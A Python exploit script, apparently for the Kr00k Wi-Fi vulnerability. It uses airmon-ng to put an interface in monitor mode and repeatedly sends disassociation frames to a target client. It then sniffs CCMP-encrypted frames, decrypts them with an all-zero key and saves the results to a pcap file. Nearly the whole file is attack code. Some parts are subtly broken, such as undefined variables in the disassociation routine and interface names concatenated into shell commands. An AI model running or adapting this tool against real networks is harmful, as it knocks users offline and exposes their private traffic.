#!/usr/bin/python3

import sys, os, time, re, argparse, threading
from scapy.sendrecv     import sniff, sendp
from scapy.layers.dot11 import Dot11, RadioTap, Dot11CCMP, Dot11FCS
from scapy.all import *
from Crypto.Cipher import AES
from subprocess import run, PIPE

class KR00K:

    def __init__(self,arg):
        self.interface = arg.interface
        self.sta_mac = arg.victim
        self.quiet = arg.verbose
        self.ap_mac = arg.bssid
        self.dst_path = arg.write_to

    def INFO(self, string):
        print("\033[1;34m [*] " + string + " \033[0m")
    def ERROR(self, string):
        print("\033[1;31m [-] " + string + " \033[0m")
    def SUCCESS(self, string):
        print("\033[1;32m [+] " + string + " \033[0m")
    def WARNING(self, string):
        print("\033[1;33m [!] " + string + " \033[0m")
    def disassociation(self):
        """
        send disassociation packet to target 
        if not specified, randomly pick target from active session
        """
        count = 5
        while True:
            pkt = RadioTap() / Dot11(\
                addr1=self.sta_mac.lower(),\
                # client mac
                addr2=self.ap_mac.lower(),\
                # ap bssid
                addr3=self.ap_mac.lower()) / Dot11Disas()
            sendp(pkt, iface=self.interface, count=count, verbose=False)
            
            self.SUCCESS(str(count),
                        ' disassociation packets sent to: ', client,
                        ' from: ', bssid )
            time.sleep(3)

    def decrypt(self, pkt):
        """
        try to decrypt traffic using all-zero tk
        """

        if pkt.haslayer(Dot11CCMP):
            try:
                qos = pkt[Dot11QoS]
                ccmp = pkt[Dot11CCMP]
                fcs = pkt[Dot11FCS]
                addr1 = re.sub(":","",pkt.addr1)
                addr2 = re.sub(":","",pkt.addr2)
                addr3 = re.sub(":","",pkt.addr3)
                # addr4 = re.sub(":","",fcs.addr4)
                PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(pkt.PN5,pkt.PN4,pkt.PN3,pkt.PN2,pkt.PN1,pkt.PN0)
                
                """
                AAD = ((bytes.fromhex(fcs.FCfield.value) + bytes.fromhex(addr1) + bytes.fromhex(addr2) \
                    + bytes.fromhex(addr3) + bytes.fromhex(fcs.SC) + bytes.fromhex(addr4) + bytes.fromhex(qos.TID))\
                    if not fcs.addr4 else \
                    (bytes.fromhex(fcs.FCfield.value) + bytes.fromhex(addr1) + bytes.fromhex(addr2) \
                    + bytes.fromhex(addr3) + bytes.fromhex(fcs.SC) + bytes.fromhex(qos.TID)))
                """

                # Priority Octet "00" 
                nonce = bytes.fromhex("00") + bytes.fromhex(addr2) + bytes.fromhex(PN)
                                
                TK = bytes.fromhex("00000000000000000000000000000000") #TK
                cipher_text = pkt.data[:-8]
                cipher = AES.new(TK, AES.MODE_CCM, nonce, mac_len=8)
                # cipher.update(AAD)
                plain_text = cipher.decrypt(cipher_text)
                assert plain_text.startswith(b'\xaa\xaa\x03'), "All-0 TK failed to decrypt"
                eth_header = bytes.fromhex(addr3 + addr2) + plain_text[6:8]
                packet = eth_header + plain_text[8:]
                self.SUCCESS("kr00k packet arrived !")

                if not self.quiet:
                    hexdump(packet)
                if self.dst_path:

                    wrpcap(self.dst_path, packet, append=True)


            except AssertionError:
                pass
                # self.WARNING("All-0 TK failed to decrypt this CCMP packet")
        else:
            pass
            # self.WARNING("Not 802.11 CCMP packet")

    def engage(self):

        t = threading.Thread(target=self.disassociation)
        t.daemon = True
        t.start()
        sniff(iface=self.interface, prn=self.decrypt)

    def read_cap(self, cap):

        self.INFO("Reading %s ......."%(cap))
        packets = rdpcap(cap)
        for packet in packets:
            self.decrypt(packet)
        
def main():

    try:
        parser = argparse.ArgumentParser(add_help=False)

        parser.add_argument('-h', '--help'        , dest="help"     , default=False, action="store_true")
        parser.add_argument('-i', '--interface'   , dest="interface", default=None, type=str)
        parser.add_argument('-t', '--target'      , dest="victim"   , default=None, type=str) # if not specified passive listen to all
        parser.add_argument('-v', '--verbose'     , dest="verbose"  , default=True, type=bool)
        parser.add_argument('-c', '--channel'     , dest="channel"  , default=1, type=int)
        parser.add_argument('-w', '--write'       , dest="write_to" , default=None, type=str)
        parser.add_argument('-r', '--read'        , dest="read"     , default=None, type=str)
        parser.add_argument('--bssid'             , dest="bssid"    , default=None, type=str)
        
        options = parser.parse_args()


        kr00k = KR00K(options)
        if os.getuid() != 0:
            kr00k.ERROR("please run as root")
            exit(0)
        kr00k.INFO("killing processes that could cause trouble. (airmon-ng check kill)")
        run(['airmon-ng check kill'], shell=True, stdout=PIPE)
        # interface_mode: CompletedProcess = run(['iwconfig ' + options.interface], shell=True, stdout=PIPE)
        kr00k.INFO("initiating monitor mode")
        run(['airmon-ng start ' + options.interface], shell=True, stdout=PIPE)
        kr00k.INFO("switching to specified channel")
        run(['iwconfig ' + options.interface + ' channel ' + str(options.channel)], shell=True, stdout=PIPE)
        kr00k.INFO("engaging")
        # spinner = spinning_cursor()
        # for _ in range(50):
        #     sys.stdout.write(next(spinner))
        #     sys.stdout.flush()
        #     time.sleep(0.1)
        #     sys.stdout.write('\b')
        if options.read!=None:
            kr00k.read_cap(options.read)
        else:
            kr00k.engage()


    except KeyboardInterrupt:
        print('Exit')
        exit(0)

def spinning_cursor():
    while True:
        for cursor in '|/-\\':
            yield '\033[1;34m'+cursor+"\033[0m"



def test():
    packets = rdpcap('WPA2-PSK-Final.cap')
    pkt = packets[483]
    ccmp = (pkt[Dot11CCMP])
    PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(ccmp.PN5,ccmp.PN4,ccmp.PN3,ccmp.PN2,ccmp.PN1,ccmp.PN0)



if __name__ == '__main__':
    main()
    # test()